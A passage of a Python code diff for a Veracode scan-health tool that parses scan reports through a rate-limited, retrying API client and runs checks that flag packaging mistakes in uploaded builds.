+    return {"build_id": (build.get("build_id") if build is not None else bid) or bid or "",
+            "version": unescape(build.get("version", "")) if build is not None else "",
+            "status": au.get("status", ""),
+            "published": au.get("published_date", "")}
+
+
+def parse_detailed_report(root: ET.Element) -> dict | None:
+    """detailedreport.do: scan metadata, flaw summary, selected modules, SCA.
+    None when the report has no static-analysis element."""
+    sa = root.find(".//static-analysis")
+    if sa is None: return None
+    fl = FlawSummary()
+    for f in root.findall(".//severity/category/cwe/staticflaws/flaw"):
+        fl.total += 1
+        apc = f.get("affects_policy_compliance","false") == "true"
+        is_fixed = f.get("remediation_status","") == "Fixed"
+        # Only an accepted (approved) mitigation removes a flaw from the open
+        # counts. "proposed" is awaiting review and still open, as are "none"
+        # and "rejected". Observed values: none, proposed, accepted, rejected.
+        is_miti = f.get("mitigation_status","none").strip().lower() == "accepted"
+        if apc: fl.pol_aff += 1
+        if is_fixed: fl.fixed += 1
+        elif is_miti: fl.mitigated += 1
+        elif apc: fl.open_pol += 1
+        else: fl.open_nopol += 1
+        # Severity breakdown of OPEN flaws only. Same XML, no extra API call.
+        if not is_fixed and not is_miti:
+            sev = _si(f.get("severity"), -1)
+            if sev == 5: fl.open_vhigh += 1
+            elif sev == 4: fl.open_high += 1
+            elif sev == 3: fl.open_med += 1
+            elif sev >= 0: fl.open_low += 1
+    # Only claim the breakdown is usable if we actually walked flaw elements.
+    fl.sev_available = fl.total > 0
+    if fl.total == 0:
+        fl.total = _si(root.get("total_flaws","0"))
+        fl.open_pol = _si(root.get("flaws_not_mitigated","0"))
+        fl.mitigated = fl.total - fl.open_pol
+    dr_mods = [{"name": unescape(m.get("name","")), "compiler": unescape(m.get("compiler","")),
+        "os": unescape(m.get("os","")), "arch": unescape(m.get("architecture",""))}
+        for m in (sa.findall(".//module") or [])]
+    sca_node = root.find(".//software_composition_analysis")
+    sca_on = sca_node is not None and sca_node.get("sca_service_available","true").lower() != "false"
+    sca_comps = [unescape(c.get("file_name","")) for c in root.findall(".//vulnerable_components/component")]
+    return {
+        "account_id": root.get("account_id",""), "app_id": root.get("app_id",""),
+        "sandbox_id": _si(root.get("sandbox_id","0")), "sandbox_name": unescape(root.get("sandbox_name","")),
+        "analysis_id": root.get("analysis_id",""), "sau_id": root.get("static_analysis_unit_id",""),
+        "bu": unescape(root.get("business_unit","")), "app_name": unescape(root.get("app_name","")),
+        "scan_name": unescape(sa.get("version","")), "engine": sa.get("engine_version",""),
+        "submitted": sa.get("submitted_date",""), "published": sa.get("published_date",""),
+        "analysis_size": _si(sa.get("analysis_size_bytes","0")),
+        # Veracode's own severity-weighted, size-adjusted score for this
+        # scan, plus policy outcome. Same response, no extra API call.
+        # Parsed defensively: absent attributes yield None, never 0.
+        "va_score": _si_or_none(sa.get("score")),
+        "va_rating": (sa.get("rating") or "").strip(),
+        "policy_status": unescape(root.get("policy_compliance_status","") or ""),
+        "policy_name": unescape(root.get("policy_name","") or ""),
+        "is_latest": root.get("is_latest_build","true").lower() == "true",
+        "flaws": fl, "dr_modules": dr_mods,
+        "sca_on": sca_on, "sca_comps": sca_comps,
+    }
+
+
+def parse_file_list(root: ET.Element) -> list[dict]:
+    """getfilelist.do: uploaded files with status and MD5."""
+    return [{"name": unescape(f.get("file_name","")), "status": unescape(f.get("file_status","")),
+             "md5": f.get("file_md5",""), "is_ignored": False, "is_third_party": False}
+            for f in root.findall(".//file")]
+
+
+def parse_prescan(root: ET.Element) -> list[dict]:
+    """getprescanresults.do: prescan modules with status, size and issues."""
+    mods: list[dict] = []
+    for m in root.findall(".//module"):
+        issues: list[str] = []
+        for iss in m.findall(".//issue"):
+            d = unescape(iss.get("details",""))
+            if d and d not in issues: issues.append(d)
+        st = unescape(m.get("status",""))
+        if st != "OK":
+            for part in st.split(","):
+                p = part.strip()
+                if p and p not in issues: issues.append(p)
+        mods.append({"name": unescape(m.get("name","")), "status": st,
+            "platform": unescape(m.get("platform","")),
+            "size": unescape(m.get("size","")), "md5": m.get("checksum",""),
+            "has_fatal": m.get("has_fatal_errors","false").lower() == "true",
+            "is_dep": m.get("is_dependency","false").lower() == "true",
+            "issues": issues, "is_selected": False, "is_ignored": False, "is_third_party": False})
+    return mods
+
+
+# ==========================================================================
+# API Client
+# ==========================================================================
+
+class AuthError(Exception):
+    """Raised only when authentication cannot possibly succeed, e.g. the very
+    first call of the run fails after the full retry window. Never raised
+    mid-run: a 401 after ten hours of collection is retried, not fatal."""
+
+
+class TransientAuthError(Exception):
+    """A 401/403 that survived the full per-request retry window.
+
+    Deliberately NOT a requests.HTTPError, so the per-endpoint handlers below
+    do not swallow it and silently report the application as having no data.
+    It propagates to the worker, which records an explicit 'Error' row and
+    moves on to the next application."""
+
+
+class XMLAPIError(requests.HTTPError):
+    """An XML API call that returned HTTP 200 with an <error> body.
+
+    Subclasses HTTPError so every handler that already catches HTTPError treats
+    it exactly like any other failed call.
+    """
+
+
+# detailedreport.do's answer for a build with no published results. This is an
+# absence, not a failure (Veracode's own scan_health tool treats it the same).
+NO_REPORT_AVAILABLE = "No report available."
+
+
+class VeracodeClient:
+    """Veracode API client with request-level pacing and adaptive backoff.
+
+    Pacing is applied per HTTP request, not per application. Each application
+    costs 6+ calls, so spacing only the applications leaves every call inside an
+    application unthrottled, which is what overwhelms the API on large tenants.
+
+    Authentication failures are retried with exponential backoff rather than
+    aborting. HMAC credentials are signed per request, so a 401 mid-run is
+    almost always a transient condition (credential rotation, a brief admin
+    revocation, a WAF or gateway blip). Throwing away hours of collection over
+    one of those is not an acceptable failure mode.
+    """
+
+    AUTH_RETRY_BASE = 30.0       # first backoff after a 401/403
+    AUTH_RETRY_CAP = 300.0       # ceiling on a single auth backoff
+    NET_RETRIES = 5              # connection-level retries per request
+
+    def __init__(self, region: str = "commercial", timeout: int = 120,
+                 pool_size: int = 16, rate_budget: float = 70.0,
+                 max_retries: int = 8, backoff_factor: float = 2.0,
+                 auth_retry_window: float = 3600.0) -> None:
+        self._cfg = REGIONS[region]
+        self._timeout = timeout
+        self._s = requests.Session()
+        self._s.auth = RequestsAuthPluginVeracodeHMAC()
+        self._s.headers["User-Agent"] = "veracode-scan-health-py/4.0"
+
+        retry = Retry(total=max_retries, backoff_factor=backoff_factor,
+                      status_forcelist=(500, 502, 503, 504),
+                      allowed_methods=("GET",),
+                      respect_retry_after_header=True,
+                      raise_on_status=False)
+        # 429 is deliberately absent from status_forcelist: the RateLimiter
+        # handles it, because a blind urllib3 retry would keep the offending
+        # bucket at the same rate and simply collide again.
+        pool = max(16, pool_size)
+        self._s.mount("https://", HTTPAdapter(max_retries=retry,
+                                              pool_connections=pool, pool_maxsize=pool))
+
+        self.limiter = RateLimiter(rate_budget)
+        self._rate_lock = threading.Lock()
+        self.request_count = 0
+
+        # --- authentication retry state
+        self._auth_window = max(0.0, auth_retry_window)
+        self.auth_retry_events = 0
+        self.auth_give_ups = 0
+        self.net_retry_events = 0
+        self.first_call_done = False
+
+    @property
+    def throttle_events(self) -> int:
+        return sum(b.throttles for b in self.limiter.buckets.values())
+
+    # ------------------------------------------------------------------
+    # Transport
+    # ------------------------------------------------------------------
+    def _auth_wait(self, attempt: int) -> float:
+        """Exponential backoff for authentication retries, capped."""
+        return min(self.AUTH_RETRY_CAP, self.AUTH_RETRY_BASE * (2 ** max(0, attempt - 1)))
+
+    def _get(self, url: str, params: dict | None, bucket: str,
+             auth_retry: bool = True) -> requests.Response:
+        """GET with per-bucket pacing, throttle handling, and retry on auth and
+        connection failures.
+
+        A 401/403 is retried for up to the configured window before this single
+        request is abandoned. The run itself is never abandoned: the caller
+        records the affected application as 'Error' and continues, and every
+        completed application is already durable in the checkpoint.
+
+        auth_retry=False returns a 401/403 response immediately instead. It is
+        for optional enrichment probes (Findings, Reporting API) where a 403
+        means "this account lacks the role", which no amount of waiting fixes.
+        """
+        return self._send("GET", url, params, bucket, auth_retry=auth_retry)
+
+    def _post(self, url: str, body: dict, bucket: str,
+              auth_retry: bool = True) -> requests.Response:
+        """POST with the same pacing, throttle and auth handling as _get.
+        Not retried on 5xx by urllib3 (allowed_methods is GET only), which is
+        correct for a request that creates server-side state."""
+        return self._send("POST", url, None, bucket, json_body=body, auth_retry=auth_retry)
+
+    def _send(self, method: str, url: str, params: dict | None, bucket: str,
+              json_body: dict | None = None,
+              auth_retry: bool = True) -> requests.Response:
+        """Shared transport for _get and _post. See _get for the semantics."""
+        auth_attempt = 0
+        auth_waited = 0.0
+        net_attempt = 0
+        while True:
+            self.limiter.acquire(bucket)
+            try:
+                r = self._s.request(method, url, params=params, json=json_body,
+                                    timeout=self._timeout)
+            except requests.RequestException as e:
+                net_attempt += 1
+                if net_attempt > self.NET_RETRIES:
+                    raise
+                with self._rate_lock:
+                    self.net_retry_events += 1
+                wait = min(60.0, 2.0 ** net_attempt)
+                log.warning("[!] Network error on %s (%s: %s). Retry %d/%d in %.0fs.",
+                            url, type(e).__name__, e, net_attempt, self.NET_RETRIES, wait)
+                time.sleep(wait)
+                continue
+
+            with self._rate_lock:
+                self.request_count += 1
+
+            if r.status_code == 429:
+                self.limiter.throttled(bucket, _parse_retry_after(r.headers.get("Retry-After")))
+                continue        # re-paced at the reduced rate
+
+            if r.status_code in (401, 403) and not auth_retry:
+                return r
+
+            if r.status_code in (401, 403):
+                auth_attempt += 1
+                wait = self._auth_wait(auth_attempt)
+                body = (r.text or "")[:200]
+                if not self.first_call_done:
+                    # Nothing has ever succeeded. Credentials are probably just
+                    # wrong; fail fast instead of burning the whole window.
+                    if auth_attempt >= 3:
+                        raise AuthError(
+                            f"HTTP {r.status_code} from {r.url} on the first API calls of "
+                            f"this run. Credentials are missing, expired, or lack the "
+                            f"required permissions. Response: {body}")
+                elif auth_waited + wait > self._auth_window:
+                    with self._rate_lock:
+                        self.auth_give_ups += 1
+                    raise TransientAuthError(
+                        f"HTTP {r.status_code} from {r.url} persisted for "
+                        f"{auth_waited / 60:.0f} minutes. Abandoning this request; the "
+                        f"run continues and completed work is checkpointed. "
+                        f"Response: {body}")
+                with self._rate_lock:
+                    self.auth_retry_events += 1
+                log.error("[!] HTTP %d (auth) on %s. Attempt %d, retrying in %.0fs "
+                          "(%.0f/%.0f min of the retry window used). The run is NOT "
+                          "aborting; %s",
+                          r.status_code, url, auth_attempt, wait,
+                          auth_waited / 60, self._auth_window / 60,
+                          "check whether the API credentials were rotated or revoked.")
+                time.sleep(wait)
+                auth_waited += wait
+                continue
+
+            if r.ok:
+                self.first_call_done = True
+            return r
+
+    def close(self) -> None: self._s.close()
+    def __enter__(self) -> "VeracodeClient": return self
+    def __exit__(self, *a: object) -> None: self.close()
+
+    def _xml(self, ep: str, params: dict | None = None) -> ET.Element:
+        r = self._get(f"{self._cfg['xml']}/{ep}", params, RateLimiter.classify(ep))
+        r.raise_for_status()
+        root = parse_xml_bytes(r.content)
+        # The XML APIs report errors as HTTP 200 with an <error> body.
+        if root.tag == "error":
+            raise XMLAPIError((root.text or "").strip()[:200], response=r)
+        return root
+
+    def _rest(self, path: str, params: dict | None = None) -> dict:
+        r = self._get(f"{self._cfg['rest']}{path}", params, "rest")
+        r.raise_for_status()
+        return r.json()
+
+    @property
+    def base(self) -> str: return self._cfg["base"]
+
+    def get_apps(self) -> list[dict]:
+        apps: list[dict] = []; page = 0
+        d: dict = {}
+        while True:
+            d = self._rest("/applications", {"page": page, "size": 500})
+            emb = d.get("_embedded", {}).get("applications", [])
+            if not emb: break
+            for a in emb:
+                p = a.get("profile", {}); pols = p.get("policies") or []
+                apps.append({"app_id": a.get("guid",""), "legacy_id": a.get("id"),
+                    "name": p.get("name",""),
+                    "bu": (p.get("business_unit") or {}).get("name",""),
+                    "policy": pols[0].get("name","") if pols else ""})
+            page += 1
+            total_pages = (d.get("page") or {}).get("total_pages")
+            if total_pages is None:
+                # Field absent: keep paging until a page comes back empty rather
+                # than assuming a single page, which would silently truncate a
+                # large tenant to the first 500 profiles.
+                continue
+            if page >= total_pages: break
+        total_elements = (d.get("page") or {}).get("total_elements")
+        if isinstance(total_elements, int) and total_elements != len(apps):
+            log.warning("Application list may be incomplete: API reported %d profiles, "
+                        "retrieved %d.", total_elements, len(apps))
+        return apps
+
+    def get_builds(self, aid: int, sbx: str | None = None) -> list[dict]:
+        p: dict = {"app_id": aid}
+        if sbx: p["sandbox_id"] = sbx
+        try: root = self._xml("getbuildlist.do", p)
+        except (requests.HTTPError, ET.ParseError) as e:
+            log.debug("getbuildlist.do failed for %s: %s", aid, e); return []
+        return [{"id": b["build_id"], "ver": b["version"]} for b in parse_build_list(root)]
+
+    def get_sandboxes(self, aid: int) -> list[dict]:
+        try: root = self._xml("getsandboxlist.do", {"app_id": aid})
+        except (requests.HTTPError, ET.ParseError) as e:
+            log.debug("getsandboxlist.do failed: %s", e); return []
+        return parse_sandbox_list(root)
+
+    def get_build_info(self, aid: int, bid: str | None = None,
+                       sbx: str | None = None) -> dict | None:
+        """Build status and published date.
+
+        Called without a build_id, getbuildinfo.do returns the most recent scan
+        for the profile, which is what this tool wants in the overwhelming
+        majority of cases. That turns build discovery into a single request
+        instead of getbuildlist plus one getbuildinfo per build walked, and it
+        is the single largest reduction in API cost per application.
+        """
+        p: dict = {"app_id": aid}
+        if bid: p["build_id"] = bid
+        if sbx: p["sandbox_id"] = sbx
+        try: root = self._xml("getbuildinfo.do", p)
+        except (requests.HTTPError, ET.ParseError) as e:
+            log.debug("getbuildinfo.do failed for app %s build %s: %s", aid, bid, e)
+            return None
+        return parse_build_info(root, bid)
+
+    # strict=True re-raises retrieval failures instead of returning an empty
+    # result, so a failed call is never mistaken for "nothing there".
+    # detailedreport's "No report available." is still None: that is an
+    # absence. The default (strict=False) behaves exactly as before.
+
+    def get_detailed_report(self, bid: str, strict: bool = False) -> dict | None:
+        try: root = self._xml("detailedreport.do", {"build_id": bid})
+        except XMLAPIError as e:
+            if strict and str(e) != NO_REPORT_AVAILABLE: raise
+            log.debug("detailedreport.do failed for %s: %s", bid, e); return None
+        except (requests.HTTPError, ET.ParseError) as e:
+            if strict: raise
+            log.debug("detailedreport.do failed for %s: %s", bid, e); return None
+        return parse_detailed_report(root)
+
+    def get_files(self, aid: int, bid: str, strict: bool = False) -> list[dict]:
+        try: root = self._xml("getfilelist.do", {"app_id": aid, "build_id": bid})
+        except (requests.HTTPError, ET.ParseError) as e:
+            if strict: raise
+            log.debug("getfilelist.do failed: %s", e); return []
+        return parse_file_list(root)
+
+    def get_prescan(self, aid: int, bid: str, strict: bool = False) -> list[dict]:
+        try: root = self._xml("getprescanresults.do", {"app_id": aid, "build_id": bid})
+        except (requests.HTTPError, ET.ParseError) as e:
+            if strict: raise
+            log.debug("getprescanresults.do failed: %s", e); return []
+        return parse_prescan(root)
+
+    # getappinfo.do is deliberately not called. It was used only to date check
+    # #30 (scan recency) from the profile's modified_date, but detailedreport
+    # already returns the scan's published_date in a response we always fetch.
+    # Published date is also the more honest signal for "not scanned recently":
+    # modified_date moves when anyone edits the profile, which is not a scan.
+
+
+# ==========================================================================
+# Module merging
+# ==========================================================================
+
+def _merge_modules(dr_modules: list[dict], prescan_modules: list[dict]) -> list[dict]:
+    by_name: dict[str, dict] = {}
+    for m in prescan_modules:
+        n = m["name"]
+        if n not in by_name:
+            by_name[n] = {**m, "was_scanned": False, "compiler": "", "os": "", "arch": ""}
+        else:
+            ex = by_name[n]
+            if m["has_fatal"]: ex["has_fatal"] = True
+            for iss in m["issues"]:
+                if iss not in ex["issues"]: ex["issues"].append(iss)
+    for dm in dr_modules:
+        n = dm["name"]
+        if n in by_name:
+            by_name[n]["is_selected"] = True; by_name[n]["was_scanned"] = True
+            by_name[n]["compiler"] = dm.get("compiler","")
+            by_name[n]["os"] = dm.get("os",""); by_name[n]["arch"] = dm.get("arch","")
+        else:
+            by_name[n] = {"name": n, "status": "OK", "platform": "", "size": "",
+                "md5": "", "has_fatal": False, "is_dep": False, "issues": [],
+                "is_selected": True, "was_scanned": True, "is_ignored": False,
+                "is_third_party": False, "compiler": dm.get("compiler",""),
+                "os": dm.get("os",""), "arch": dm.get("arch","")}
+    return list(by_name.values())
+
+
+# ==========================================================================
+# Individual check functions
+# ==========================================================================
+
+CheckFunc = Callable[[list[dict], list[dict], FlawSummary, dict, bool, list[str], str], tuple[list[Issue], list[str]]]
+
+def _chk(sev: str, msg: str) -> Issue: return Issue(severity=sev, description=msg)
+
+def check_01_junk_files(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []; ign: list[str] = []
+    for idx, f in enumerate(files):
+        nm = f["name"]
+        if nm.lower().endswith(".pdb") or nm.lower() in (".gitignore","head"):
+            files[idx]["is_ignored"] = True; continue
+        if _fancy_match(nm, JUNK_FILE_PATTERNS):
+            files[idx]["is_ignored"] = True; ign.append(nm)
+    for idx, m in enumerate(modules):
+        if _fancy_match(m["name"], JUNK_FILE_PATTERNS): modules[idx]["is_ignored"] = True
+    if ign:
+        msg = f'An unnecessary file was uploaded: "{ign[0]}".' if len(ign)==1 else f'{len(ign)} unnecessary files were uploaded: {_top5(ign)}.'
+        issues.append(_chk("medium", msg))
+        recs.append("Follow the packaging instructions or use the Veracode auto-packager (https://docs.veracode.com/r/About_auto_packaging) to keep the upload as small as possible to improve upload and scan times.")
+    return issues, recs
+
+def check_02_third_party(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, sca_comps: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []; sel_tp: list[str] = []
+    for idx, f in enumerate(files):
+        if _fancy_match(f["name"], THIRD_PARTY_PATTERNS): files[idx]["is_third_party"] = True
+    for idx, f in enumerate(files):
+        if not f["is_third_party"] and f["name"] in sca_comps: files[idx]["is_third_party"] = True
+    for idx, m in enumerate(modules):
+        if _fancy_match(m["name"], THIRD_PARTY_PATTERNS):
+            modules[idx]["is_third_party"] = True
+            if m.get("is_selected"): sel_tp.append(m["name"])
+        if not m["is_third_party"] and m["name"] in sca_comps:
+            modules[idx]["is_third_party"] = True
+    if sel_tp:
+        msg = f'A third-party component was selected as an entry point: "{sel_tp[0]}".' if len(sel_tp)==1 else f'{len(sel_tp)} third-party components selected as entry points: {_top5(sel_tp)}.'
+        issues.append(_chk("medium", msg)); recs.append("Only select first party components as the entry points for the analysis.")
+    return issues, recs
+
+def check_03_flaw_count(files: list[dict], modules: list[dict], flaws: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    if flaws.total == 0:
+        issues.append(_chk("medium", "No flaws were found in this scan. This is usually due to scan misconfiguration."))
+        recs.append("When no flaws have been found this can be an indication that incorrect modules were selected, or the main application was not selected for analysis.")
+    elif flaws.total > MAX_FLAW_COUNT:
+        issues.append(_chk("medium", "A large number of flaws were reported in this scan."))
+        recs.append(f"More than {MAX_FLAW_COUNT} flaws were found which can be an indication that the scan could be misconfigured.")
+    return issues, recs
+
+def check_04_fatal_errors(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    # 4a. missing primary debug symbols (.NET)
+    fp = [m["name"] for m in modules if m["has_fatal"] and _is_dotnet(m["name"]) and not m["is_ignored"] and not m["is_third_party"] and _has_status(m, "Primary Files Compiled without Debug Symbols")]
+    if fp:
+        msg = f'{len(fp)} module(s) could not be scanned due to missing debug symbols (PDB): {_top5(fp)}.' if len(fp)>1 else f'Module could not be scanned due to missing debug symbols (PDB): "{fp[0]}".'
+        issues.append(_chk("high", msg)); recs.append("Include PDB files for as many components as possible, especially first and second party components.")
+    # 4b. no scannable Java binaries
+    fj = [m["name"] for m in modules if m["has_fatal"] and _is_java(m["name"]) and _has_status(m, "No Scannable Binaries")]
+    if fj:
+        msg = f'{len(fj)} Java module(s) contained no compiled Java classes: {_top5(fj)}.' if len(fj)>1 else f'Java module contained no compiled classes: "{fj[0]}".'
+        issues.append(_chk("high", msg)); recs.append("Veracode requires Java apps compiled into JAR, WAR or EAR.")
+    # 4c. nested JARs
+    fn = [m["name"] for m in modules if m["has_fatal"] and _is_java(m["name"]) and _has_status(m, "does not support jar files nested inside")]
+    if fn:
+        msg = f'{len(fn)} Java module(s) contained nested/shaded JARs: {_top5(fn)}.' if len(fn)>1 else f'Java module contained nested JARs: "{fn[0]}".'
+        issues.append(_chk("high", msg)); recs.append("Veracode does not support nested JARs except for Spring Boot.")
+    return issues, recs
+
+def check_05_unscannable_java(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    uj = [m["name"] for m in modules if _is_java(m["name"]) and m["has_fatal"]
+          and not _has_status(m, "No Scannable Binaries") and not _has_status(m, "does not support jar files nested inside")]
+    if uj:
+        issues.append(_chk("high", f'{len(uj)} Java module(s) not scannable: {_top5(uj)}.'))
+        recs.append("Veracode requires Java apps compiled into JAR, WAR or EAR.")
+        recs.append("The Veracode CLI can be used to package Java apps: https://docs.veracode.com/r/About_auto_packaging.")
+    return issues, recs
+
+def check_06_unwanted_files(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    for pats, ftype, rr in [
+        (UNWANTED_7Z,"7-zip file",["Veracode does not support 7-zip. Consider zip files instead."]),
+        (UNWANTED_COFFEE,"CoffeeScript file",["CoffeeScript is not supported.","Review JS/TS packaging: https://docs.veracode.com/r/compilation_jscript."]),
+        (UNWANTED_SCRIPTS,"batch/shell script",["Do not upload batch/shell scripts."]),
+        (UNWANTED_INSTALLERS,"installer",["Do not upload installers or setup programs."]),
+        (UNWANTED_PYD,"Python-compiled DLL",["Do not upload .pyd files."]),
+        (UNWANTED_PYC,"compiled Python file",["Veracode requires Python source code. Do not upload compiled .pyc."]),
+        (UNWANTED_DEPLOY,'ClickOnce ".deploy" file',["Veracode does not support ClickOnce deployments."]),
+        (UNWANTED_WIBU,"CodeMeter obfuscation file",["Do not use code obfuscation tools other than Dotfuscator Community Edition."]),
+    ]:
+        ff = _fancy_match_files(files, pats)
+        if ff:
+            msg = f'{len(ff)} {ftype}(s) uploaded: {_top5(ff)}.' if len(ff)>1 else f'A {ftype} was uploaded: "{ff[0]}".'
+            issues.append(_chk("medium", msg))
+            for rec in rr: recs.append(rec)
+            recs.append("Follow packaging instructions: https://docs.veracode.com/r/About_auto_packaging.")
+    return issues, recs
+
+def check_07_nested_archives(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    na = list(dict.fromkeys([f["name"] for f in files if f["status"] == "Archive File Within Another Archive" and not f.get("is_ignored")]))
+    if na:
+        issues.append(_chk("high", f'{len(na)} nested archive(s) uploaded: {_top5(na)}. Veracode does not process nested archives.'))
+        recs.append("Do not upload nested archives.")
+    return issues, recs
+
+def check_08_missing_precompiled(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    pcf = _fancy_match_files(files, DOTNET_PRECOMPILE_PATTERNS)
+    if pcf:
+        issues.append(_chk("high", f'{len(pcf)} .NET view/template file(s) uploaded: {_top5(pcf)}. Precompile ASP.NET views.'))
+        recs.append("Precompile ASP.NET projects and upload all generated assemblies.")
+    pc_mods = [m["name"] for m in modules if m.get("is_selected") and _is_dotnet(m["name"]) and not m["is_ignored"] and not m["is_third_party"] and any("No precompiled files were found" in iss for iss in m.get("issues",[]))]
+    if pc_mods:
+        issues.append(_chk("medium", f'{len(pc_mods)} .NET component(s) missing precompiled files: {_top5(pc_mods)}.'))
+    return issues, recs
+
+def check_09_missing_sca(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, sca_on: bool, sca_comps: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    if sca_on and not sca_comps:
+        if any(_fancy_match(f["name"], SCA_SUPPORTED) for f in files):
+            issues.append(_chk("medium", "No SCA results for this scan. Possible misconfiguration."))
+            recs.append("Follow packaging guidance: https://docs.veracode.com/r/compilation_packaging.")
+    return issues, recs
+
+def check_10_unselected_js(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    uj = list(dict.fromkeys([m["name"] for m in modules if _is_js_module(m["name"]) and not _is_node_module(m["name"])
+              and "extracted from .map file" not in m["name"].lower()
+              and not m["has_fatal"] and not m["is_ignored"] and not m.get("is_selected") and not m["is_third_party"]]))
+    if uj:
+        issues.append(_chk("medium", f'{len(uj)} JS module(s) not selected: {_top5(uj)}.'))
+        recs.append('Select "JS files within ..." modules for JavaScript coverage.')
+        recs.append("Under-selection of first party modules affects results quality: https://community.veracode.com/s/article/What-are-Modules-and-how-do-my-results-change-based-on-what-I-select.")
+    return issues, recs
+
+def check_11_unexpected_source(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    for pats, ft, rr in [
+        (SRC_JAVA,"Java source",["Do not upload Java source. Compile into JAR/WAR/EAR: https://docs.veracode.com/r/compilation_java."]),
+        (SRC_CS,"C# source",["Do not upload C# source. Compile with debug symbols: https://docs.veracode.com/r/compilation_net."]),
+        (SRC_SLN,".NET solution file",["Do not upload .sln files."]),
+        (SRC_CSPROJ,"C# project file",["Do not upload .csproj files."]),
+        (SRC_C,"C source",["Do not upload C source. Compile with debug symbols."]),
+        (SRC_CPP,"C++ source",["Do not upload C++ source. Compile with debug symbols."]),
+        (SRC_SWIFT,"Swift source",["Do not upload Swift source. Compile per iOS packaging guidelines."]),
+    ]:
+        ff = _fancy_match_files(files, pats)
+        if ff:
+            issues.append(_chk("high", f'{len(ff)} {ft} file(s) uploaded: {_top5(ff)}. Veracode requires compiled binaries.'))
+            for rec in rr: recs.append(rec)
+    return issues, recs
+
+def check_12_missing_supporting(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []; ms_mods: list[str] = []; ms_count = 0
+    for m in modules:
+        if not m.get("is_selected") or m["is_ignored"]: continue
+        for iss in m.get("issues",[]):
+            if iss.startswith("Missing Supporting Files"):
+                parts = iss.split(" ")
+                if len(parts) > 4:
+                    try: ms_count += int(parts[4]); ms_mods.append(m["name"]) if m["name"] not in ms_mods else None
+                    except ValueError: pass
+    if ms_count:
+        issues.append(_chk("medium", f'{len(ms_mods)} module(s) missing {ms_count} supporting file(s): {_top5(ms_mods)}.'))
+        recs.append("Resolve missing supporting files on the Review Modules page.")
+        recs.append("Ensure all components are present for analysis.")
+    return issues, recs
+
+def check_13_missing_debug(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    md = list(dict.fromkeys([m["name"] for m in modules if _is_dotnet(m["name"]) and not m["is_ignored"] and not m["is_third_party"]
+          and any("No supporting files or PDB files" in iss for iss in m.get("issues",[]))]))
+    if md:
+        issues.append(_chk("medium", f'{len(md)} module(s) lack debug symbols (PDB): {_top5(md)}.'))
+        recs.append("Include PDB files for first and second party components.")
+    return issues, recs
+
+def check_14_unsupported_platform(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    upc = list(dict.fromkeys([m["name"] for m in modules if m["has_fatal"] and not m["is_ignored"] and not m["is_third_party"]
+           and (_has_status(m,"(Fatal)Unsupported Platform") or _has_status(m,"(Fatal)Unsupported Compiler"))]))
+    if upc:
+        issues.append(_chk("high", f'{len(upc)} module(s) have unsupported platform/compiler: {_top5(upc)}.'))
+        recs.append("Review packaging docs to ensure compiler is supported.")
+    return issues, recs
+
+def check_15_gradle_wrapper(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    gw = _fancy_match_modules(modules, GRADLE_WRAPPER, selected_only=True)
+    if gw:
+        issues.append(_chk("high", '"gradle-wrapper.jar" selected for analysis. This is a build tool, not the application.'))
+        recs.append('Do not upload or select "gradle-wrapper.jar".')
+        recs.append("Use Veracode CLI: https://docs.veracode.com/r/About_auto_packaging.")
+    return issues, recs
+
+def check_16_sensitive_files(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    for pats, desc, sr in [
+        (SENSITIVE_SECRET_PATTERNS, "potentially sensitive/secret file", ["Do not upload secrets, certificates, or keys."]),
+        (SENSITIVE_BACKUP_PATTERNS, "backup/old file", ["Do not upload backup files."]),
+        (SENSITIVE_WORD_PATTERNS, "Word document", ["Office documents could contain sensitive information."]),
+        (SENSITIVE_SPREADSHEET_PATTERNS, "spreadsheet", ["Office documents could contain sensitive information."]),
